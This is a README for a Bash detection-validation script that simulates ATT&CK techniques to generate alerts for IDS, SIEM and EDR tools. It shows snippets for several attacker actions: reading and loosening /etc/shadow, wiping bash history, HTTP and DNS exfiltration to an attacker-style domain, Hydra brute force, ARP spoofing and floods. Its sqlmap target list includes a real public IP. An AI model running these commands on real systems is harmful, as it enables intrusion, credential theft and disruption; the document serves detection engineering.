# ⚔️ Network Traffic & Detection Validation Script

> A Linux-based network telemetry and adversary simulation script designed to generate observable security events for IDS/IPS, SIEM, EDR, and network monitoring validation.

---

# 📌 Overview

This Bash script automates:

* Network discovery
* Traffic generation
* Service interaction
* Protocol testing
* Detection trigger simulation
* MITRE ATT&CK–mapped behaviors
* Security tool validation

The script generates telemetry across multiple protocols and system activities to help validate monitoring visibility and detection rules.

---

# ⚠️ Warning

This script performs:

* Port scanning
* Flood traffic generation
* Brute-force simulations
* ARP spoofing
* MITM-related activity
* Vulnerability scanning
* Credential-access simulation

Run only in:

* Authorized lab environments
* Test networks
* Isolated virtual machines

Do not run on production or unauthorized systems.

---

# ⚙️ Script Workflow

---

# 1️⃣ Root Privilege Check

The script verifies that it is executed with root privileges.

```bash id="6v0h1t"
if [[ $EUID -ne 0 ]]; then
    echo "[!] Run as root"
    exit 1
fi
```

---

# 2️⃣ Network Detection

The script automatically detects:

* Active network interface
* Local IP address
* Gateway
* Public IP

Example:

```bash id="i4fq3h"
INTERFACE=$(ip -o -4 route show to default | awk '{print $5}')
LOCAL_IP=$(ip -4 addr show "$INTERFACE")
GATEWAY=$(ip route | awk '/default/ {print $3}')
```

---

# 3️⃣ Network Status Analysis

The script identifies whether the system is using:

* Loopback
* Private LAN
* Public Interface

---

# 4️⃣ Automatic Dependency Installation

The script checks and installs required tools.

## Installed Tools

```bash id="zax6q9"
nmap
hping3
hydra
bettercap
sqlmap
nikto
crunch
responder
snmpwalk
smbclient
sipp
socat
openssl
```

---

# 5️⃣ Service Initialization

The script enables and starts:

```bash id="4d7fml"
apache2
ssh
snmpd
smbd
```

---

# 6️⃣ URL List Preparation

A file named `type` is created containing multiple HTTP/HTTPS targets.

Example:

```bash id="3r8lfe"
http://testmynids.org/uid/index.html
https://102.130.113.30
```

---

# 7️⃣ HTTP / HTTPS Traffic Generation

The script generates:

* HTTP requests
* HTTPS requests
* SQLMap-style User-Agent requests
* File download attempts

Example:

```bash id="mj7k1w"
curl -A "sqlmap/1.0"
```

---

# 8️⃣ DNS Traffic Generation

The script generates DNS activity using:

* `nslookup`
* `dig`

Including randomized domains.

Example:

```bash id="r2cn3e"
nslookup random1234.test
```

---

# 9️⃣ SSL/TLS Handshake Simulation

The script uses OpenSSL to simulate TLS connections.

Example:

```bash id="e0q6na"
openssl s_client -connect google.com:443
```

---

# 🔟 Port Checking

The script checks common ports on the gateway:

```bash id="7lpwq8"
21 22 23 25 53 80 110 139 143 443 445 3306 3389 8080
```

Using:

```bash id="mf7xqy"
nc -z
```

---

# 1️⃣1️⃣ SMTP / IMAP Simulation

The script simulates:

* SMTP connections
* IMAP logout traffic

Example:

```bash id="cw8r5m"
echo QUIT | nc smtp.gmail.com 587
```

---

# 1️⃣2️⃣ SMB Enumeration

The script performs SMB share enumeration using:

```bash id="5yod2s"
smbclient -L
```

---

# 1️⃣3️⃣ Network Statistics Collection

The script collects connection data using:

```bash id="3j8qdp"
ss -antp
netstat -ant
```

---

# 1️⃣4️⃣ SQLMap Execution

The script launches automated SQLMap scans against:

* Local targets
* URLs from the target file

Example:

```bash id="kg0x7s"
sqlmap -u "$url"
```

---

# 1️⃣5️⃣ Network Service Discovery

The script performs service discovery against gateway ports.

Mapped Technique:

| Technique | Description               |
| --------- | ------------------------- |
| T1046     | Network Service Discovery |

---

# 1️⃣6️⃣ SSH Remote Service Simulation

The script attempts SSH connections to a target node.

Example:

```bash id="ql4s1k"
ssh fakeuser@"$TARGET_NODE"
```

Mapped Technique:

| Technique | Description         |
| --------- | ------------------- |
| T1021.004 | SSH Remote Services |

---

# 1️⃣7️⃣ Application Layer Protocol Simulation

The script generates repeated web requests using `curl`.

Example:

```bash id="s0i9w2"
curl -A "Mozilla/5.0 (C2-Emulator)"
```

Mapped Technique:

| Technique | Description                |
| --------- | -------------------------- |
| T1071.001 | Application Layer Protocol |

---

# 1️⃣8️⃣ Data Exfiltration Simulation

The script sends Base64-encoded data using HTTP POST requests.

Example:

```bash id="ob6g4n"
curl -X POST -d "data=$DATA_TO_EXFIL"
```

Mapped Technique:

| Technique | Description                            |
| --------- | -------------------------------------- |
| T1048     | Exfiltration Over Alternative Protocol |

---

# 1️⃣9️⃣ Discovery Commands

The script executes:

```bash id="1xzq6n"
whoami
id
uname -a
ip addr
route -n
cat /etc/passwd
```

Mapped Techniques:

| Technique | Description                  |
| --------- | ---------------------------- |
| T1082     | System Information Discovery |
| T1033     | System Owner/User Discovery  |
| T1016     | Network Discovery            |
| T1087     | Account Discovery            |

---

# 2️⃣0️⃣ Credential Access Simulation

The script accesses:

```bash id="6ntr4v"
cat /etc/shadow
ls -la ~/.ssh/
```

Mapped Technique:

| Technique | Description           |
| --------- | --------------------- |
| T1003.008 | OS Credential Dumping |

---

# 2️⃣1️⃣ Persistence Simulation

The script creates:

* Cron jobs
* Bash configuration modifications

Examples:

```bash id="w7g4ke"
echo "* * * * * root ..."
echo "alias ls='ls -la'" >> ~/.bashrc
```

Mapped Technique:

| Technique | Description                           |
| --------- | ------------------------------------- |
| T1546.004 | Unix Shell Configuration Modification |

---

# 2️⃣2️⃣ Defense Evasion Simulation

The script performs:

```bash id="m3f2yx"
history -c
rm -f ~/.bash_history
chmod 777 /etc/shadow
```

Mapped Techniques:

| Technique | Description                  |
| --------- | ---------------------------- |
| T1070.002 | Clear Linux Logs             |
| T1222.002 | File Permission Modification |

---

# 2️⃣3️⃣ DNS Exfiltration Simulation

The script generates DNS queries:

```bash id="6d1jcu"
nslookup attacker-controlled-domain.com
```

Mapped Technique:

| Technique | Description                            |
| --------- | -------------------------------------- |
| T1011     | Exfiltration Over Other Network Medium |

---

# 2️⃣4️⃣ Proxy / Tunnel Simulation

The script launches:

```bash id="5yzk6r"
ssh -D 1080 -N localhost
```

Mapped Technique:

| Technique | Description |
| --------- | ----------- |
| T1090     | Proxy       |

---

# 2️⃣5️⃣ Timestomping Simulation

The script modifies timestamps on dummy files.

Example:

```bash id="tf4o2q"
touch -a -m -t 202301010101.01
```

Mapped Technique:

| Technique | Description  |
| --------- | ------------ |
| T1070.006 | Timestomping |

---

# 2️⃣6️⃣ Reconnaissance & Vulnerability Scanning

The script performs:

```bash id="2qg7fh"
nmap --script vuln
nikto -h
```

Mapped Technique:

| Technique | Description            |
| --------- | ---------------------- |
| T1595.002 | Vulnerability Scanning |

---

# 2️⃣7️⃣ Flood Traffic Generation

The script generates:

* SYN flood traffic
* UDP flood traffic
* ICMP flood traffic
* Xmas flood traffic

Using:

```bash id="9n7v3m"
hping3
ping -f
```

---

# 2️⃣8️⃣ Payload & Injection Simulations

The script sends:

* SQL injection patterns
* Path traversal patterns
* Script injection strings
* EICAR test string

Examples:

```bash id="9v7a2e"
' OR 1=1 --
../../etc/passwd
<script>alert()</script>
```

---

# 2️⃣9️⃣ Brute Force Simulation

The script launches Hydra against:

* SSH
* SMB

Example:

```bash id="8c2slo"
hydra -l root -P wordlist ssh://target
```

Mapped Technique:

| Technique | Description |
| --------- | ----------- |
| T1110     | Brute Force |

---

# 3️⃣0️⃣ Adversary-in-the-Middle Simulation

The script launches:

* Responder
* ARP spoofing
* Bettercap

Examples:

```bash id="q6e2xf"
responder -I
arpspoof
bettercap
```

Mapped Technique:

| Technique | Description             |
| --------- | ----------------------- |
| T1557     | Adversary-in-the-Middle |

---

# 📡 Protocols Generated

The script generates telemetry for:

* HTTP
* HTTPS
* DNS
* SMTP
* IMAP
* SMB
* SSH
* SIP
* DHCP
* SNMP
* ICMP
* TCP
* UDP

---

# 🧪 Security Tool Validation

The script can generate telemetry useful for validating:

| Tool           | Validation Type       |
| -------------- | --------------------- |
| Suricata       | IDS alerts            |
| Zeek           | Network visibility    |
| Wazuh          | Host-based alerts     |
| Splunk         | SIEM correlation      |
| Elastic SIEM   | Detection engineering |
| Security Onion | SOC monitoring        |

---

# 🚀 Execution

```bash id="9d5w6g"
chmod +x script.sh
sudo ./script.sh
```

---



---

# 🔐 Safety Recommendations

* Use isolated virtual machines
* Run inside a lab network
* Monitor traffic using IDS/IPS
* Avoid production environments

---

# 📜 License

For:

* Detection engineering
* SOC testing
* Security research
* Educational lab usage

Use responsibly and only in authorized environments.
